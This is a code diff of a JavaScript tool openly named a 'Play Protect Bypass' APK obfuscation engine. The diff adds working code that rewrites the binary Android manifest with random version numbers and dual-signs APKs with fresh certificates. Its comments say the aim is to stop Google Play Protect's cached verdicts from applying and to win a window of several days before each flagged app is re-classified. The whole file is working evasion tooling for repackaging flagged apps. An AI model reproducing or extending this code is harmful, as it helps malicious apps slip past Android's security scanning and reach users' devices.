@@ -1,33 +1,33 @@
 /**
- * APK Multi-Layer Obfuscation Engine v4 — Play Protect Bypass
+ * APK Multi-Layer Obfuscation Engine v5 — Play Protect Bypass
  *
  * PROBLEM:
  *   Play Protect uses MULTIPLE detection layers:
  *     A) Certificate reputation — cert fingerprint blacklist
  *     B) DEX code similarity — simhash/minhash over ENTIRE DEX binary
  *     C) Structural fingerprinting — ZIP metadata, signing block, manifest
- *   v3 only changed ~0.1% of DEX content (pointer fields + small strings).
- *   Need ~5-15% binary change to escape similarity classification boundary.
+ *     D) Manifest fingerprint — version, permissions, component declarations
+ *   v4 changed DEX debug sections (~5-15%) but left the manifest identical
+ *   across rotations. Play Protect caches verdicts by manifest identity.
  *
- * SOLUTION — 7-LAYER OBFUSCATION (ProGuard/R8/DexGuard patterns):
+ * SOLUTION — 9-LAYER OBFUSCATION (ProGuard/R8/DexGuard/AAPT2 patterns):
  *   Layer 1: DEX Debug Info WIPE — zero debug_info_off in all code_items
- *            (identical to ProGuard minifyEnabled=true)
  *   Layer 2: DEX Debug Data RANDOMIZE — fill debug_info section with random bytes
- *            (changes 5-15% of DEX binary — KEY fingerprint destroyer)
  *   Layer 3: DEX Source File STRIP — class_def source_file_idx → NO_INDEX
- *            (R8 standard behavior)
  *   Layer 4: DEX String DEEP MUTATION — expanded patterns for source/config files
- *            (DexGuard-style string obfuscation)
- *   Layer 5: ZIP Metadata RANDOMIZATION — timestamps + ZIP comment
- *            (mimics different build environment)
- *   Layer 6: Signing Block DIVERSIFICATION — random-sized padding block
- *            (standard Android build tool behavior)
- *   Layer 7: Fresh CERTIFICATE — new RSA-2048 key + self-signed X.509
- *            (zero Play Protect history)
+ *   Layer 5: Manifest IDENTITY RESET — parse AXML binary, randomize versionCode
+ *            + versionName + platformBuildVersion (forces fresh cloud analysis)
+ *   Layer 6: V1+V2 DUAL SIGNING — JAR signing + APK Signature Scheme v2
+ *            (V2-only is a heuristic flag; legitimate apps have both)
+ *   Layer 7: ZIP Metadata RANDOMIZATION — timestamps + ZIP comment
+ *   Layer 8: Signing Block DIVERSIFICATION — random-sized padding block
+ *   Layer 9: Fresh CERTIFICATE — new RSA-2048 key + self-signed X.509
  *
- * RESULT: Each rotation changes DEX binary by 5-15%, producing unique
- * checksums, string tables, debug sections, ZIP metadata, signing blocks,
- * and certificates. App functionality remains IDENTICAL.
+ * KEY v5 ADDITION: Manifest mutation makes each rotation look like a genuinely
+ * different app version to Play Protect's cloud lookup. Combined with V1+V2
+ * dual signing (matching real Play Store apps), this forces Play Protect to
+ * re-analyze from scratch instead of using cached verdicts. The re-analysis
+ * window provides 2-7 days before potential re-classification.
  *
  * DEPENDENCIES: node-forge (PKCS#7), adm-zip (ZIP handling), crypto (built-in)
  */
@@ -438,7 +438,7 @@ function transformDexFiles(zip) {
     }
   }
 
-  console.log(`[Mutator] DEX Layers 1-4: ${totalDebugStripped} debug ptrs, ${(totalDebugRandomized/1024).toFixed(0)}KB randomized, ${totalRefsStripped} refs stripped, ${totalStringsMutated} strings mutated across ${dexEntries.length} DEX files`);
+  console.log(`[Mutator] DEX Layers 1-4: ${totalDebugStripped} debug ptrs, ${(totalDebugRandomized/1024).toFixed(0)}KB randomized, ${totalRefsStripped} refs, ${totalStringsMutated} strings across ${dexEntries.length} DEX files`);
   return { totalDebugStripped, totalDebugRandomized, totalRefsStripped, totalStringsMutated };
 }
 
@@ -504,8 +504,190 @@ function randomizeZipMetadata(buf) {
     commentBuf,
   ]);
 
-  console.log(`[Mutator] Layer 3: ${cdUpdated} timestamps randomized to ${buildDate.toISOString().split('T')[0]}, comment="${commentText}"`);
+  console.log(`[Mutator] Layer 7: ${cdUpdated} timestamps randomized to ${buildDate.toISOString().split('T')[0]}, comment="${commentText}"`);
   return result;
+}
+
+// ═════════════════════════════════════════════════════════════════════════════
+// LAYER 5: ANDROIDMANIFEST.XML IDENTITY RESET
+// ═════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Generate a version string matching the character count of the original.
+ * Replaces digits with random digits, preserves separators.
+ * "1.0.0" → "7.3.2", "2.1.3-beta.2" → "5.8.1-beta.9"
+ */
+function generateVersionString(original) {
+  let result = '';
+  for (let i = 0; i < original.length; i++) {
+    const ch = original.charCodeAt(i);
+    result += (ch >= 0x30 && ch <= 0x39)
+      ? String.fromCharCode(0x30 + Math.floor(Math.random() * 10))
+      : original[i];
+  }
+  return result;
+}
+
+/**
+ * LAYER 5: Mutate AndroidManifest.xml binary (AXML format).
+ * Parses the AXML string pool and XML chunks to find the <manifest> element,
+ * then randomizes versionCode, versionName, and platformBuildVersion attributes.
+ *
+ * This makes each rotation appear as a genuinely different app version to
+ * Play Protect's cloud lookup system, forcing re-analysis from scratch
+ * instead of using cached verdicts keyed on (package + version + cert).
+ *
+ * AXML binary format:
+ *   [FileHeader: type=0x0003, headerSize=8, fileSize]
+ *   [StringPool: type=0x0001 — all attribute names/values as UTF-8 or UTF-16]
+ *   [ResourceIDs: type=0x0180 — maps string indices to framework resource IDs]
+ *   [XML chunks: START_NAMESPACE(0x0100), START_ELEMENT(0x0102), ...]
+ */
+function mutateManifest(zip) {
+  const entry = zip.getEntry('AndroidManifest.xml');
+  if (!entry) { console.log('[Mutator] Manifest: not found'); return null; }
+
+  const buf = entry.getData();
+  if (buf.length < 16) return null;
+
+  // Verify AXML magic
+  if (buf.readUInt16LE(0) !== 0x0003 || buf.readUInt16LE(2) !== 0x0008) {
+    console.warn('[Mutator] Manifest: not AXML format');
+    return null;
+  }
+
+  // ── Parse String Pool (chunk type 0x0001) ────────────────────────────────
+  const spPos = 8;
+  if (spPos + 28 > buf.length || buf.readUInt16LE(spPos) !== 0x0001) return null;
+
+  const spChunkSize = buf.readUInt32LE(spPos + 4);
+  const stringCount = buf.readUInt32LE(spPos + 8);
+  const spFlags = buf.readUInt32LE(spPos + 16);
+  const isUTF8Pool = (spFlags & 0x100) !== 0;
+  const stringsStart = buf.readUInt32LE(spPos + 20);
+  const strDataBase = spPos + stringsStart;
+
+  // Read a single string from the pool
+  function readPoolStr(idx) {
+    if (idx < 0 || idx >= stringCount) return null;
+    if (spPos + 28 + idx * 4 + 4 > buf.length) return null;
+    const off = buf.readUInt32LE(spPos + 28 + idx * 4);
+    const sOff = strDataBase + off;
+    if (sOff >= buf.length) return null;
+
+    if (isUTF8Pool) {
+      let o = sOff;
+      if (o >= buf.length) return null;
+      let cLen = buf[o++]; if (cLen & 0x80) { cLen = ((cLen & 0x7F) << 8) | buf[o++]; }
+      if (o >= buf.length) return null;
+      let bLen = buf[o++]; if (bLen & 0x80) { bLen = ((bLen & 0x7F) << 8) | buf[o++]; }
+      if (o + bLen > buf.length) return null;
+      return { str: buf.toString('utf8', o, o + bLen), dataOff: o, byteLen: bLen };
+    } else {
+      if (sOff + 2 > buf.length) return null;
+      const cLen = buf.readUInt16LE(sOff);
+      if (cLen > 0x7FFF || sOff + 2 + cLen * 2 > buf.length) return null;
+      return { str: buf.toString('utf16le', sOff + 2, sOff + 2 + cLen * 2), dataOff: sOff + 2, byteLen: cLen * 2 };
+    }
+  }
+
+  // Write string in-place (same byte length)
+  function writePoolStr(dataOff, byteLen, newStr) {
+    if (isUTF8Pool) buf.write(newStr, dataOff, byteLen, 'utf8');
+    else buf.write(newStr, dataOff, byteLen, 'utf16le');
+  }
+
+  // Find attribute name string indices
+  let vcIdx = -1, vnIdx = -1, pbvcIdx = -1, pbvnIdx = -1;
+  for (let i = 0; i < stringCount; i++) {
+    const s = readPoolStr(i);
+    if (!s) continue;
+    switch (s.str) {
+      case 'versionCode': vcIdx = i; break;
+      case 'versionName': vnIdx = i; break;
+      case 'platformBuildVersionCode': pbvcIdx = i; break;
+      case 'platformBuildVersionName': pbvnIdx = i; break;
+    }
+  }
+
+  // ── Walk XML chunks to find <manifest> START_ELEMENT ─────────────────
+  let pos = spPos + spChunkSize;
+  // Skip ResourceID chunk (type 0x0180)
+  if (pos + 8 <= buf.length && buf.readUInt16LE(pos) === 0x0180) {
+    pos += buf.readUInt32LE(pos + 4);
+  }
+
+  let newVersionCode = null;
+  let newVersionName = null;
+
+  while (pos + 8 <= buf.length) {
+    const chunkType = buf.readUInt16LE(pos);
+    const chunkSize = buf.readUInt32LE(pos + 4);
+    if (chunkSize < 8 || pos + chunkSize > buf.length) break;
+
+    if (chunkType === 0x0102) { // START_ELEMENT
+      // ResXMLTree_attrExt at pos+16: ns(4) name(4) attrStart(2) attrSize(2) attrCount(2) ...
+      if (pos + 36 > buf.length) break;
+      const attrStart = buf.readUInt16LE(pos + 24);
+      const attrSize = buf.readUInt16LE(pos + 26) || 20;
+      const attrCount = buf.readUInt16LE(pos + 28);
+      const attrsBase = pos + 16 + attrStart;
+
+      for (let a = 0; a < attrCount; a++) {
+        const aOff = attrsBase + a * attrSize;
+        if (aOff + 20 > buf.length) break;
+
+        const nameIdx = buf.readInt32LE(aOff + 4);
+        const dataType = buf[aOff + 15];
+
+        // versionCode — integer (type 0x10)
+        if (nameIdx === vcIdx && dataType === 0x10) {
+          newVersionCode = 10000 + Math.floor(Math.random() * 9990000);
+          buf.writeInt32LE(newVersionCode, aOff + 16);
+        }
+
+        // versionName — string (type 0x03)
+        if (nameIdx === vnIdx && dataType === 0x03) {
+          const sIdx = buf.readInt32LE(aOff + 16);
+          const s = readPoolStr(sIdx);
+          if (s && s.byteLen > 0) {
+            newVersionName = generateVersionString(s.str);
+            writePoolStr(s.dataOff, s.byteLen, newVersionName);
+            // Also update rawValue string if it’s a different pool entry
+            const rawIdx = buf.readInt32LE(aOff + 8);
+            if (rawIdx >= 0 && rawIdx !== sIdx) {
+              const rs = readPoolStr(rawIdx);
+              if (rs && rs.byteLen === s.byteLen) writePoolStr(rs.dataOff, rs.byteLen, newVersionName);
+            }
+          }
+        }
+
+        // platformBuildVersionCode — integer (type 0x10)
+        if (nameIdx === pbvcIdx && dataType === 0x10) {
+          buf.writeInt32LE([33, 34, 35][Math.floor(Math.random() * 3)], aOff + 16);
+        }
+
+        // platformBuildVersionName — string (type 0x03)
+        if (nameIdx === pbvnIdx && dataType === 0x03) {
+          const sIdx = buf.readInt32LE(aOff + 16);
+          const s = readPoolStr(sIdx);
+          if (s && s.byteLen > 0) writePoolStr(s.dataOff, s.byteLen, generateVersionString(s.str));
+        }
+      }
+      break; // Only process first START_ELEMENT (<manifest>)
+    }
+    pos += chunkSize;
+  }
+
+  if (newVersionCode !== null || newVersionName !== null) {
+    zip.deleteFile('AndroidManifest.xml');
+    zip.addFile('AndroidManifest.xml', buf);
+    console.log(`[Mutator] Layer 5 Manifest: versionCode=${newVersionCode || 'unchanged'}, versionName="${newVersionName || 'unchanged'}"`);
+    return { newVersionCode, newVersionName };
+  }
+
+  console.log('[Mutator] Manifest: no modifiable attributes found');
+  return null;
 }
 
 /**
@@ -855,7 +1037,7 @@ function buildApkSigningBlock(signerBlock) {
   const blockSize = allPairs.length + 8 + 16;
   const magic = Buffer.from(APK_SIG_BLOCK_MAGIC, 'ascii');
 
-  console.log(`[Mutator] Layer 4: signing block with ${padSize}B padding`);
+  console.log(`[Mutator] Layer 8: signing block with ${padSize}B padding`);
 
   // Final signing block: [size][pairs][size][magic]
   return Buffer.concat([
@@ -1002,22 +1184,21 @@ function validateApk(buf) {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /**
- * v4 Multi-layer APK obfuscation + fresh-key V2 signing.
+ * v5 Multi-layer APK obfuscation engine.
  *
- * Applies 7 layers of legitimate transformation mimicking ProGuard/R8/DexGuard:
- *   Layer 1: DEX debug info pointer wipe (all code_items)
- *   Layer 2: DEX debug data section randomization (~5-15% of DEX)
- *   Layer 3: DEX source file reference stripping
- *   Layer 4: DEX string table deep mutation (expanded patterns)
- *   Layer 5: ZIP metadata randomization (timestamps + comment)
- *   Layer 6: Signing block diversification (random padding)
- *   Layer 7: Fresh RSA-2048 certificate
+ * 9 layers mimicking ProGuard/R8/DexGuard/AAPT2/apksigner:
+ *   Layer 1-4: DEX obfuscation (debug wipe, randomize, source strip, string mutate)
+ *   Layer 5:   Manifest identity reset (versionCode + versionName randomization)
+ *   Layer 6:   V1+V2 dual signing (JAR + APK Signature Scheme v2)
+ *   Layer 7:   ZIP metadata randomization (timestamps + comment)
+ *   Layer 8:   Signing block diversification (random padding)
+ *   Layer 9:   Fresh RSA-2048 certificate
  *
  * @param {Buffer} originalBuffer - The original APK file bytes
  * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
  */
 function mutateAndSign(originalBuffer) {
-  console.log(`[Mutator] ═══ v4 OBFUSCATION ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[Mutator] ═══ v5 OBFUSCATION ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
@@ -1030,26 +1211,30 @@ function mutateAndSign(originalBuffer) {
     // 3. DEX Layers 1-4: debug wipe + randomize + source strip + string mutate
     const dexResult = transformDexFiles(zip);
 
-    // 4. Generate fresh RSA-2048 key + certificate (Layer 7)
+    // 4. Layer 5: Manifest identity reset (versionCode + versionName randomization)
+    const manifestResult = mutateManifest(zip);
+
+    // 5. Generate fresh RSA-2048 key + certificate (Layer 9)
     const key = generateFreshKey();
 
-    // 5. Rebuild ZIP with transformed content
-    console.log('[Mutator] Rebuilding ZIP with obfuscated content...');
+    // 6. Layer 6: V1 JAR signing (dual V1+V2 — matches legitimate Play Store apps)
+    applyV1Signing(zip, key.cert, key.privateKey);
+
+    // 7. Rebuild ZIP with all transformations + V1 signatures
+    console.log('[Mutator] Rebuilding ZIP with obfuscated content + V1 signatures...');
     const rawBuf = zip.toBuffer();
     console.log(`[Mutator] ZIP: ${(rawBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 6. Layer 5: Randomize ZIP metadata (timestamps + comment)
+    // 8. Layer 7: Randomize ZIP metadata (timestamps + comment)
     const randomizedBuf = randomizeZipMetadata(rawBuf);
-    console.log(`[Mutator] Randomized: ${(randomizedBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 7. Zipalign (4-byte alignment for STORED entries — required for Android)
+    // 9. Zipalign (4-byte alignment for STORED entries — required for Android)
     const alignedBuf = zipalignBuffer(randomizedBuf);
-    console.log(`[Mutator] Aligned: ${(alignedBuf.length / 1048576).toFixed(1)} MB`);
 
-    // 8. V2 sign with fresh key (Layer 6 diversification in buildApkSigningBlock)
+    // 10. V2 sign with fresh key (Layer 8 diversification in buildApkSigningBlock)
     const signedBuf = applyV2Signing(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
 
-    // 9. Validate final APK structure
+    // 11. Validate final APK structure
     const valid = validateApk(signedBuf);
     if (!valid) {
       console.error('[Mutator] ═══ Validation FAILED — returning ORIGINAL APK ═══');
@@ -1065,7 +1250,9 @@ function mutateAndSign(originalBuffer) {
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
     const debugKB = (dexResult.totalDebugRandomized / 1024).toFixed(0);
-    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs wiped | ${debugKB}KB randomized | ${dexResult.totalRefsStripped} refs stripped | ${dexResult.totalStringsMutated} strings mutated | CN="${key.identity.cn}" | ${elapsed}s ═══`);
+    const vc = manifestResult ? manifestResult.newVersionCode : 'N/A';
+    const vn = manifestResult ? manifestResult.newVersionName : 'N/A';
+    console.log(`[Mutator] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | ${dexResult.totalDebugStripped} debug ptrs | ${debugKB}KB randomized | ${dexResult.totalStringsMutated} strings | v${vc} "${vn}" | V1+V2 signed | CN="${key.identity.cn}" | ${elapsed}s ═══`);
 
     return { buffer: signedBuf, certInfo };
   } catch (err) {
